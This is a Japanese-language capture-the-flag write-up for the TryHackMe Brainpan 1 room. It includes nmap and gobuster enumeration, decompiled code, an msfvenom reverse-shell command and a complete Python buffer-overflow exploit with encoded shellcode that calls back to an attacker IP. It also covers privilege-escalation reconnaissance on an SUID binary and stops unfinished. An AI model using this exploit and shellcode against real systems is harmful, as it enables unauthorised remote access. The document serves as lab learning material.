# Brainpan 1 CTF

https://tryhackme.com/room/brainpan

## Enumeration

```shell
TARGET=10.201.61.215
```

### ポートスキャン

```shell
sudo nmap -sS -p- $TARGET
PORT      STATE SERVICE
9999/tcp  open  abyss
10000/tcp open  snet-sensor-mgmt
```

```sh
nmap -sV -p9999,10000 $TARGET

PORT      STATE SERVICE VERSION
9999/tcp  open  abyss?
10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)
```

10000ポートはHTTP。  
9999ポートは brainpan のプログラムが動いている。パスワードが必要。

```sh
$ nc $TARGET 9999   
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|

[________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD                              

                          >> password
                          ACCESS DENIED
```

### ディレクトリ列挙

binディレクトリを発見。

```shell
cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt | sort -u > ./dirlist.txt

gobuster dir -q -x=exe -u http://$TARGET:10000 -w ./dirlist.txt -t 64 -k

/bin                  (Status: 301) [Size: 0]
```

ブラウザでアクセスすると、brainpan.exe があった。

## リバース

```c
int __cdecl _main(int _Argc,char **_Argv,char **_Env)
{
  int iVar1;
  size_t in_stack_fffff9f0;
  sockaddr local_5dc;
  sockaddr local_5cc;
  SOCKET local_5b4;
  SOCKET local_5b0;
  WSADATA local_5ac;
  undefined4 local_414;
  undefined4 local_410;
  int local_40c;
  char *local_408;
  char *local_404;
  char *local_400;
  char local_3fc [1016];
  
  __alloca(in_stack_fffff9f0);
  ___main();
  local_400 = 
  "_|                            _|                                        \n_|_|_|    _|  _|_|    _ |_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  \n_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|\n_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _ |\n_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|\n                                            _|                          \n                                            _ |\n\n[________________________ WELCOME TO BRAINPAN _________________________]\n                          ENTER THE PASSWORD                              \n\n                          >> "
  ;
  local_404 = "                          ACCESS DENIED\n";
  local_408 = "                          ACCESS GRANTED\n";
  local_410 = 9999;
  local_414 = 1;
  printf("[+] initializing winsock...");
  iVar1 = _WSAStartup@8(0x202,&local_5ac);
  if (iVar1 == 0) {
    printf("done.\n");
    local_5b0 = socket(2,1,0);
    if (local_5b0 == 0xffffffff) {
      _WSAGetLastError@0();
      printf("[!] could not create socket: %d");
    }
    printf("[+] server socket created.\n");
    local_5cc.sa_family = 2;
    local_5cc.sa_data[2] = '\0';
    local_5cc.sa_data[3] = '\0';
    local_5cc.sa_data[4] = '\0';
    local_5cc.sa_data[5] = '\0';
    local_5cc.sa_data._0_2_ = htons(9999);
    iVar1 = bind(local_5b0,&local_5cc,0x10);
    if (iVar1 == -1) {
      _WSAGetLastError@0();
      printf("[!] bind failed: %d");
    }
    printf("[+] bind done on port %d\n");
    listen(local_5b0,3);
    printf("[+] waiting for connections.\n");
    local_40c = 0x10;
    while (local_5b4 = accept(local_5b0,&local_5dc,&local_40c), local_5b4 != 0xffffffff) {
      printf("[+] received connection.\n");
      memset(local_3fc,0,1000);
      iVar1 = strlen(local_400);
      send(local_5b4,local_400,iVar1,0);
      recv(local_5b4,local_3fc,1000,0);
      local_414 = get_reply(local_3fc);
      printf("[+] check is %d\n");
      iVar1 = get_reply(local_3fc);
      if (iVar1 == 0) {
        iVar1 = strlen(local_404);
        send(local_5b4,local_408,iVar1,0);
      }
      else {
        iVar1 = strlen(local_408);
        send(local_5b4,local_404,iVar1,0);
      }
      closesocket(local_5b4);
    }
    _WSAGetLastError@0();
    printf("[!] accept failed: %d");
  }
  else {
    _WSAGetLastError@0();
    printf("[!] winsock init failed: %d");
  }
  return 1;
}

void __cdecl get_reply(char *param_1)
{
  char local_20c [520];
  
  printf("[get_reply] s = [%s]\n");
  strcpy(local_20c,param_1);
  strlen(local_20c);
  printf("[get_reply] copied %d bytes to buffer\n");
  strcmp(local_20c,"shitstorm\n");
  return;
}
```

パスワードは shitstorm

```sh
$ nc $TARGET 9999
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|

[________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD                              

                          >> shitstorm
                          ACCESS GRANTED
```

wineを使ってローカルで実行し、パターン文字列を送る。

```sh
Unhandled exception: page fault on read access to 0x66616167 in wow64 32-bit code (0x66616167).
Register dump:
 CS:0023 SS:002b DS:002b ES:002b FS:006b GS:0063
 EIP:66616167 ESP:0052f8f0 EBP:66616166 EFLAGS:00010297(  R- --  I S -A-P-C)
 EAX:ffffffff EBX:3fff1000 ECX:3117303f EDX:ffffffff
 ESI:00000000 EDI:00000000
Stack dump:
0x0052f8f0:  66616168 66616169 6661616a 6661616b
0x0052f900:  6661616c 6661616d 6661616e 6661616f
0x0052f910:  66616170 66616171 66616172 66616173
0x0052f920:  66616174 66616175 66616176 66616177
0x0052f930:  66616178 66616179 6761617a 67616162
0x0052f940:  67616163 67616164 67616165 67616166
Backtrace:
=>0 0x66616167 (0x66616166)
```

`EIP:0x66616167 -> gaaf` は525文字目。

Immunity Debugger で jmp esp を検索し、1個だけ見つかる。

```sh
!mona jmp -r esp -cpb "\x00"

0BADF00D   [+] Results :
311712F3     0x311712f3 : jmp esp |  {PAGE_EXECUTE_READ} [brainpan.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (D:\vmware\share\brainpan.exe), 0x0
0BADF00D       Found a total of 1 pointers
```

シェルコード生成

```sh
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.146.32 LPORT=6666 -b "\x00\x0a" -f python
```

```python
import socket

ip="10.201.61.215"
port=9999

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip,port))

# ダミー
buf =  b"A" * 524

# JMP ESP
# 0x311712f3
buf += b"\xf3\x12\x17\x31"

# シェルコード
## NOP
buf += b"\x90" * 20
## リバースシェル
buf += b"\xbb\x6e\x16\x92\x30\xda\xd8\xd9\x74\x24\xf4\x5a"
buf += b"\x2b\xc9\xb1\x52\x31\x5a\x12\x03\x5a\x12\x83\xac"
buf += b"\x12\x70\xc5\xcc\xf3\xf6\x26\x2c\x04\x97\xaf\xc9"
buf += b"\x35\x97\xd4\x9a\x66\x27\x9e\xce\x8a\xcc\xf2\xfa"
buf += b"\x19\xa0\xda\x0d\xa9\x0f\x3d\x20\x2a\x23\x7d\x23"
buf += b"\xa8\x3e\x52\x83\x91\xf0\xa7\xc2\xd6\xed\x4a\x96"
buf += b"\x8f\x7a\xf8\x06\xbb\x37\xc1\xad\xf7\xd6\x41\x52"
buf += b"\x4f\xd8\x60\xc5\xdb\x83\xa2\xe4\x08\xb8\xea\xfe"
buf += b"\x4d\x85\xa5\x75\xa5\x71\x34\x5f\xf7\x7a\x9b\x9e"
buf += b"\x37\x89\xe5\xe7\xf0\x72\x90\x11\x03\x0e\xa3\xe6"
buf += b"\x79\xd4\x26\xfc\xda\x9f\x91\xd8\xdb\x4c\x47\xab"
buf += b"\xd0\x39\x03\xf3\xf4\xbc\xc0\x88\x01\x34\xe7\x5e"
buf += b"\x80\x0e\xcc\x7a\xc8\xd5\x6d\xdb\xb4\xb8\x92\x3b"
buf += b"\x17\x64\x37\x30\xba\x71\x4a\x1b\xd3\xb6\x67\xa3"
buf += b"\x23\xd1\xf0\xd0\x11\x7e\xab\x7e\x1a\xf7\x75\x79"
buf += b"\x5d\x22\xc1\x15\xa0\xcd\x32\x3c\x67\x99\x62\x56"
buf += b"\x4e\xa2\xe8\xa6\x6f\x77\xbe\xf6\xdf\x28\x7f\xa6"
buf += b"\x9f\x98\x17\xac\x2f\xc6\x08\xcf\xe5\x6f\xa2\x2a"
buf += b"\x6e\x9a\x38\xa6\x4e\xf2\x3c\xc6\x94\x08\xc8\x20"
buf += b"\xc2\x1c\x9c\xfb\x7b\x84\x85\x77\x1d\x49\x10\xf2"
buf += b"\x1d\xc1\x97\x03\xd3\x22\xdd\x17\x84\xc2\xa8\x45"
buf += b"\x03\xdc\x06\xe1\xcf\x4f\xcd\xf1\x86\x73\x5a\xa6"
buf += b"\xcf\x42\x93\x22\xe2\xfd\x0d\x50\xff\x98\x76\xd0"
buf += b"\x24\x59\x78\xd9\xa9\xe5\x5e\xc9\x77\xe5\xda\xbd"
buf += b"\x27\xb0\xb4\x6b\x8e\x6a\x77\xc5\x58\xc0\xd1\x81"
buf += b"\x1d\x2a\xe2\xd7\x21\x67\x94\x37\x93\xde\xe1\x48"
buf += b"\x1c\xb7\xe5\x31\x40\x27\x09\xe8\xc0\x57\x40\xb0"
buf += b"\x61\xf0\x0d\x21\x30\x9d\xad\x9c\x77\x98\x2d\x14"
buf += b"\x08\x5f\x2d\x5d\x0d\x1b\xe9\x8e\x7f\x34\x9c\xb0"
buf += b"\x2c\x35\xb5"

s.recv(1024)
s.send(buf + b"\n")
s.recv(1024)
```

リバースシェルを取れた。この時点で「初期アクセス取得」は成功と判断。

```sh
$ nc -lnvp 6666     
listening on [any] 6666 ...
connect to [10.11.146.32] from (UNKNOWN) [10.201.61.215] 46663
CMD Version 1.4.1

Z:\home\puck>
```

## 権限昇格１

wineでWindowsライクな環境になっている模様。

```sh
Directory of Z:\home\puck

  3/6/2013   3:23 PM  <DIR>         .
  3/4/2013  11:49 AM  <DIR>         ..
  3/6/2013   3:23 PM           513  checksrv.sh
  3/4/2013   2:45 PM  <DIR>         web
       1 file                       513 bytes
       3 directories     13,744,623,616 bytes free


Z:\home\puck>type checksrv.sh
#!/bin/bash
# run brainpan.exe if it stops
lsof -i:9999
if [[ $? -eq 1 ]]; then 
        pid=`ps aux | grep brainpan.exe | grep -v grep`
        if [[ ! -z $pid ]]; then
                kill -9 $pid
                killall wineserver
                killall winedevice.exe
        fi
        /usr/bin/wine /home/puck/web/bin/brainpan.exe &
fi 

# run SimpleHTTPServer if it stops
lsof -i:10000
if [[ $? -eq 1 ]]; then 
        pid=`ps aux | grep SimpleHTTPServer | grep -v grep`
        if [[ ! -z $pid ]]; then
                kill -9 $pid
        fi
        cd /home/puck/web
        /usr/bin/python -m SimpleHTTPServer 10000
fi
```

```sh
Directory of Z:\home

  3/4/2013  11:49 AM  <DIR>         .
  3/4/2013  10:15 AM  <DIR>         ..
  3/4/2013   2:38 PM  <DIR>         anansi
  3/6/2013   3:23 PM  <DIR>         puck
  3/4/2013   2:43 PM  <DIR>         reynard
       0 files                        0 bytes
       5 directories     13,744,623,616 bytes free
```

絶対パス指定でLinuxコマンドも実行可能。

`/usr/local/bin/validate` に anansi のSUIDが付いている。

```sh
Z:\>/usr/bin/find / -perm -u=s -type f -ls 2>/dev/null

Z:\>525499   64 -rwsr-xr-x   1 root     root        63632 Sep  6  2012 /bin/umount
525495   32 -rwsr-xr-x   1 root     root        31124 Sep  6  2012 /bin/su
525498   88 -rwsr-xr-x   1 root     root        88768 Sep  6  2012 /bin/mount
530420   32 -rwsr-xr-x   1 root     root        30112 Jun 11  2012 /bin/fusermount
525651   40 -rwsr-xr-x   1 root     root        39124 Oct  2  2012 /bin/ping6
525650   36 -rwsr-xr-x   1 root     root        34780 Oct  2  2012 /bin/ping
658003  116 -rwsr-xr-x   2 root     root       115140 Feb 27  2013 /usr/bin/sudo
672442   60 -rwsr-xr-x   1 root     root        60344 Jun 18  2012 /usr/bin/mtr
658477   32 -rwsr-xr-x   1 root     root        30936 Sep  6  2012 /usr/bin/newgrp
658673   32 -rwsr-xr-x   1 root     root        31756 Sep  6  2012 /usr/bin/chsh
658003  116 -rwsr-xr-x   2 root     root       115140 Feb 27  2013 /usr/bin/sudoedit
658676   40 -rwsr-xr-x   1 root     root        40300 Sep  6  2012 /usr/bin/chfn
672094   16 -rwsr-xr-x   1 root     root        14020 Oct  2  2012 /usr/bin/traceroute6.iputils
671718   48 -rwsr-sr-x   1 daemon   daemon      46576 Jun 11  2012 /usr/bin/at
675550   16 -rwsr-xr-x   1 root     lpadmin     13672 Dec  4  2012 /usr/bin/lppasswd
658671   44 -rwsr-xr-x   1 root     root        41292 Sep  6  2012 /usr/bin/passwd
658667   60 -rwsr-xr-x   1 root     root        57964 Sep  6  2012 /usr/bin/gpasswd
672668   20 -rwsr-sr-x   1 libuuid  libuuid     17996 Sep  6  2012 /usr/sbin/uuidd
672521  296 -rwsr-xr--   1 root     dip        301944 Sep 26  2012 /usr/sbin/pppd
656771   12 -rwsr-xr-x   1 anansi   anansi       8761 Mar  4  2013 /usr/local/bin/validate
925433  312 -rwsr-xr--   1 root     messagebus   317564 Oct  3  2012 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
925584  244 -rwsr-xr-x   1 root     root       248064 Sep  6  2012 /usr/lib/openssh/ssh-keysign
788361    8 -rwsr-xr-x   1 root     root         5452 Jun 25  2012 /usr/lib/eject/dmcrypt-get-device
657855   12 -rwsr-xr-x   1 root     root         9740 Oct  3  2012 /usr/lib/pt_chown
```

`/home/anansi/bin/anansi_util` を rootとして実行可能。

```sh
Z:\>/usr/bin/sudo -l

Z:\>Matching Defaults entries for puck on this host:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User puck may run the following commands on this host:
    (root) NOPASSWD: /home/anansi/bin/anansi_util
```

コマンドの使い方が不明。

```sh
Z:\>/usr/bin/sudo /home/anansi/bin/anansi_util

Z:\>Usage: /home/anansi/bin/anansi_util [action]
Where [action] is one of:
  - network
  - proclist
  - manual [command]
```

SUID の validate をリバース

```c
int main(int argc,char **argv)
{
  char *pcVar1;
  char *s;
  
  if (argc < 2) {
    printf("usage %s <input>\n",*argv);
  }
  else {
    printf("validating input...");
    pcVar1 = validate(argv[1]);
    if (pcVar1 != (char *)0x0) {
      puts("passed.");
    }
  }
  return 0;
}

char * validate(char *s)
{
  size_t sVar1;
  char buf [100];
  int i;
  
  i = 0;
  while( true ) {
    sVar1 = strlen(s);
    if (sVar1 <= (uint)i) {
      strcpy(buf,s);
      return buf;
    }
    if (s[i] == 'F') break;
    i = i + 1;
  }
  printf("failed: %x\n",(int)s[i]);
                    /* WARNING: Subroutine does not return */
  exit(1);
}
```

- パラメータ文字列を100バイトのバッファにコピーしている。文字列長を見ていないのでバッファオーバーフローが発生する。
- 文字F が含まれていたらそこで中断し、バッファへのコピーは行われない。

保護機能はほぼ無効になっている。

```sh
$ pwn checksec ./validate 
[*] '/home/kali/ctf/tmp/validate'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x8048000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
    Debuginfo:  Yes
```

方針としては、このバッファオーバーフローを利用してanansiのシェルを取得し、  
その後に /home/anansi/bin/anansi_util を解析して root シェルを取得できると思われる。

```sh
Program received signal SIGSEGV, Segmentation fault.
0x62616165 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
──────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────
 EAX  0xffffc798 ◂— 0x61616161 ('aaaa')
 EBX  0x62616163 ('caab')
 ECX  0xffffd0e0 ◂— 0x4c4f4300
 EDX  0xffffcd74 ◂— 0x67616100
 EDI  0xf7ffcb60 (_rtld_global_ro) ◂— 0
 ESI  0x80485b0 (__libc_csu_init) ◂— push ebp
 EBP  0x62616164 ('daab')
 ESP  0xffffc810 ◂— 0x62616166 ('faab')
 EIP  0x62616165 ('eaab')
```

eaab は 117 文字目。

続きは後日

## 権限昇格２


## 振り返り

-
-

## Tags

#tags:pwn(Windows)

## メモ

### シェル安定化

```shell
# python が無くても、python3 でいける場合もある
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm

# Ctrl+Z でバックグラウンドにした後に
stty raw -echo; fg

#（終了後）エコー無効にして入力非表示になっているので
reset

# まず、他のターミナルを開いて rows, columns の値を調べる
stty -a

# リバースシェルで rows, cols を設定する
stty rows 52
stty cols 236
```

### SSH接続エラー

```sh
# no matching host key type found. Their offer: ssh-rsa,ssh-dss
# このエラーが出るのはサーバー側のバージョンが古いためなので、下記オプション追加。
-oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=ssh-rsa
```
